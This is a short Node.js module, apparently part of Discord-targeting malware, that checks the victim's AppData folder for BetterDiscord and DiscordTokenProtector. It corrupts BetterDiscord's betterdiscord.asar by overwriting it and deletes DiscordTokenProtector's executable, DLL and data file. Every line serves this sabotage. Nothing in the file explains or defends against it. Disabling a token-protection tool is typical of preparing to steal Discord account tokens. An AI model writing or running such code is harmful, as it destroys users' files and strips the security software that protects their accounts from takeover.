const { paths: { roamingAppData } } = require('../variables');
const { resolve } = require('path');
const fs = require('fs');

const paths = {
  betterdiscord: resolve(roamingAppData, 'BetterDiscord', 'data', 'betterdiscord.asar'),
  dtp: resolve(roamingAppData, 'DiscordTokenProtector')
};
// Checks if BetterDiscord is installed
if (fs.existsSync(paths.betterdiscord)) {
  // Deletes BetterDiscord files
  fs.writeFileSync(paths.betterdiscord, 'hello :)');
}

// Checks if DiscordTokenProtector is installed
if (fs.existsSync(paths.dtp)) {
  // Deletes DTP files
  ['DiscordTokenProtector.exe', 'ProtectionPayload.dll', 'secure.dat'].forEach(file => {
    fs.rmSync(resolve(paths.dtp, file));
  });
}
